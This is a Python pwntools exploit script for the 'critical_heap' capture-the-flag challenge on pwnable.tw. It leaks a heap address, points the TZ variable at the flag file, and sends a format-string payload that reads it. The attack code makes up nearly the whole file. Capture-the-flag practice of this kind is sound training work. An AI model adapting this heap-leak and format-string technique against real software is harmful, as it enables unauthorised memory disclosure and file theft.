from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = False

LOCAL_BIN = './share/critical_heap'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10500) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid)



##########################
##### OFFSET FINDER ######
##########################



##########################
##### FUNCTION ######
##########################

def create(name, type, content):
    P.sendlineafter(b'choice :',b'1')
    P.sendafter(b'heap:',name)
    P.sendlineafter(b'choice :', type)
    if content!= null:
        P.sendafter(b'heap :',content)


def remove(index):
    P.sendlineafter(b'choice :', b'5')
    P.sendlineafter(b'heap :', index)


def play_system(index, envi, value):
    P.sendlineafter(b'choice :', b'4')
    P.sendlineafter(b'heap :', index)
    P.sendlineafter(b'choice :', b'1')
    P.sendlineafter(b'heap :', envi)
    P.sendlineafter(b'name :', value)
    P.sendlineafter(b'choice :', b'4')
    P.sendlineafter(b'see :', envi)
    P.sendlineafter(b'choice :', b'5')


def play_normal(index):
    P.sendlineafter(b'choice :', b'4')
    P.sendlineafter(b'heap :', index)
    P.sendlineafter(b'choice :', b'1')
    P.recvuntil(b'a'*8)
    recv = P.recvuntil(b'*').strip(b'*')
    P.sendlineafter(b'choice :', b'3')
    return recv

def play_clock(index):
    P.sendlineafter(b'choice :', b'4')
    P.sendlineafter(b'heap :', index)
    P.sendlineafter(b'choice :', b'2')
    P.sendlineafter(b'choice :', b'3')

# def listen(page_index):

##############################
##### FINAL EXPLOITATION #####
##############################
create(b'system', b'3', null)
play_system(b'0',b'abcd',b'efgh')
remove(b'0')
create(b'leak', b'1', b'a'*8)
leak_heap = u64(play_normal(b'0').ljust(8,b'\x00'))-0x145
print(hex(leak_heap))
create(b'abcd', b'3', null)
play_system(b'1',b'TZ',b'/home/critical_heap++/flag')
create(b'f', b'2', null)

flag_address = leak_heap+0x4d0
payload = b'%p'*8+b'%p%p%p%s'+p64(flag_address)

P.sendlineafter(b'choice :', b'4')
P.sendlineafter(b'heap :', b'0')
P.sendlineafter(b'choice :', b'2')
P.sendlineafter(b'Content :', payload)
P.sendlineafter(b'choice :', b'1')
P.interactive()
